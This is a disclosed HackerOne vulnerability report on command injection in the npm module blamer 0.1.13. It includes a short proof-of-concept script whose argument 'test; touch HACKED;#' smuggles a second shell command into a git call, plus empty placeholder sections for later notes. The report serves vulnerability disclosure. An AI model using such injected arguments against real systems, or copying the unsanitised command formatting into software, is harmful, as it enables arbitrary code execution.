---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '772448'
original_report_id: '772448'
title: '[blamer] RCE via insecure command formatting'
weakness: Code Injection
team_handle: nodejs-ecosystem
created_at: '2020-01-11T22:55:05.419Z'
disclosed_at: '2020-03-10T09:38:42.363Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- code-injection
---

# [blamer] RCE via insecure command formatting

## Metadata

- HackerOne Report ID: 772448
- Weakness: Code Injection
- Program: nodejs-ecosystem
- Disclosed At: 2020-03-10T09:38:42.363Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `RCE` issue in the `blamer` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `blamer`
**version:** `0.1.13`
**npm page:** `https://www.npmjs.com/package/blamer`

## Module Description
> Blamer is a tool for get information about author of code from version control system. Supports git and subversion.

## Module Stats
[~1800] downloads in the last day
[12,910] downloads in the last week
[~52k] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/kucherenko/blamer/blob/master/src/vcs/git.js#L24

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var Blamer = require('blamer');
var blamer = new Blamer('git');
blamer.blameByFile('poc.js', 'test; touch HACKED;#');

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i blamer # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F681902}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `blamer`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
